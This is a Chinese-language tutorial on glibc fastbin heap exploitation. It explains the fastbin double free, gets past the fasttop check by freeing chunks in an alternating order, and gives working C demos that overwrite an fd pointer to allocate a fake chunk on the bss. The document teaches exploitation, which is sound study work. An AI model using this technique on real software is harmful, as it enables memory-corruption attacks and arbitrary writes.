# Fastbin Attack

Fastbin Attack 指基于 fastbin 机制的一类漏洞利用方法。前提如下：

1. 存在堆溢出、UFA等能控制chunk内容的漏洞
2. 漏洞发生在fastbin类型的chunk中

主要为四类：

1. Fastbin Double Free
2. House of Spirit
3. Alloc to Stack
4. Arbitrary Alloc

其中，前两种主要漏洞侧重于利用 free 函数释放真的 chunk 或伪造的 chunk，然后再次申请 chunk 进行攻击，后两种侧重于故意修改 fd 指针，直接利用 malloc 申请指定位置 chunk 进行攻击

## 原理

fastbin attack 存在的原因在于 fastbin 是使用单链表来维护释放的堆块的，并且由 fastbin 管理的 chunk 即使被释放，其 next_chunk 的 prev_inuse 位也不会被清空。
例，

```c++
int main(void)
{
    void *chunk1,*chunk2,*chunk3;
    chunk1=malloc(0x30);
    chunk2=malloc(0x30);
    chunk3=malloc(0x30);
    free(chunk1);
    free(chunk2);
    free(chunk3);
    return 0;
}
```

释放前：

![Alt](img/wiki-FastbinAttack1.png)

释放后：
此时位于 main_arena 中的 fastbin 链表中已经储存了指向 chunk3 的指针，并且 chunk 3、2、1 构成了一个单链表

![Alt](img/wiki-FastbinAttack2.png)
![Alt](img/wiki-FastbinAttack3.png)

## Fastbin Double Free

Fastbin Double Free 是指 fastbin 的 chunk 可以被多次释放，因此可以在 fastbin 链表中存在多次(释放后申请）。这样导致的后果是多次分配可以从 fastbin 链表中取出同一个堆块，相当于多个指针指向同一个堆块，结合堆块的数据内容可以实现类似于类型混淆 (type confused) 的效果。
Fastbin Double Free可以成功利用的原因：

1. fastbin 的堆块被释放后 next_chunk 的 pre_inuse 不会被清空
2. fastbin 在执行free的时候仅验证了 main_arena 直接指向的块，即链表指针头部的块，对于后面的块不会验证

```c++
/* Another simple check: make sure the top of the bin is not the
       record we are going to add (i.e., double free).  */
    if (__builtin_expect (old == p, 0))
      {
        errstr = "double free or corruption (fasttop)";
        goto errout;
}
```

## 例

```c++
int main(void)
{
    void *chunk1,*chunk2,*chunk3;
    chunk1=malloc(0x10);
    chunk2=malloc(0x10);

    free(chunk1);
    free(chunk1);
    return 0;
}
```

编译执行后，_int_free 函数会检测到 fastbin 的 double free。

![Alt](img/wiki-FastbinAttack4.png)

在chunk1释放之后释放chunk2，然后再释放chunk1，就不会被检测到（此时main_arena（fastbin的head） 指向chunk2而不是指向chunk1）

```c++
int main(void)
{
    void *chunk1,*chunk2,*chunk3;
    chunk1=malloc(0x10);
    chunk2=malloc(0x10);

    free(chunk1);
    free(chunk2);
    free(chunk1);
    return 0;
}
```

![Alt](img/wiki-FastbinAttack5.png)

因为chunk1 被再次释放，所以其fd值不再为0而是指向chunk2（再次free(chunk1)时，因为chunk1会被添加到链首，所以chunk1的fd指向chunk2），此时如果可以控制chunk1的内容，便可以写入其fd指针，从而实现任意地址分配fastbin块。

```c++
typedef struct _chunk
{
    long long pre_size;
    long long size;
    long long fd;
    long long bk;
} CHUNK,*PCHUNK;

CHUNK bss_chunk;

int main(void)
{
    void *chunk1,*chunk2,*chunk3;
    void *chunk_a,*chunk_b;

    bss_chunk.size=0x21;
    chunk1=malloc(0x10);
    chunk2=malloc(0x10);

    free(chunk1);
    free(chunk2);
    free(chunk1);

    chunk_a=malloc(0x10);
    *(long long *)chunk_a=&bss_chunk;
    malloc(0x10);
    malloc(0x10);
    chunk_b=malloc(0x10);
    printf("chunk_b = %p\n",chunk_b);
    return 0;
}

```

首先先构造 `main_arena -> chunk1 -> chunk2 -> chunk1`的fastbin链表。然后调用malloc返回chunk1之后修改chunk1的fd指针指向bss段上的bss_chunk,之后再malloc时就会分配到bss_chunk

编译后输出如下：

![Alt](img/wiki-FastbinAttack6.png)

> main函数中设置`bss_chunk.size=0x21;`是因为 _int_malloc 会对欲分配位置的 size 域进行验证，如果其 size 与当前 fastbin 链表应有 size 不符就会抛出异常

![Alt](img/wiki-FastbinAttack7.png)

_int_malloc 中的校验：

```c++
if (__builtin_expect (fastbin_index (chunksize (victim)) != idx, 0))
    {
      errstr = "malloc(): memory corruption (fast)";
    errout:
      malloc_printerr (check_action, errstr, chunk2mem (victim));
      return NULL;
}
```

通过 fastbin double free 可以使用多个指针控制同一个堆块，这可以用于篡改一些堆块中的关键数据域或者是实现类似于类型混淆的效果。 如果更进一步修改 fd 指针，则能够实现任意地址分配堆块的效果 (首先要通过验证)，这就相当于任意地址写任意值的效果。
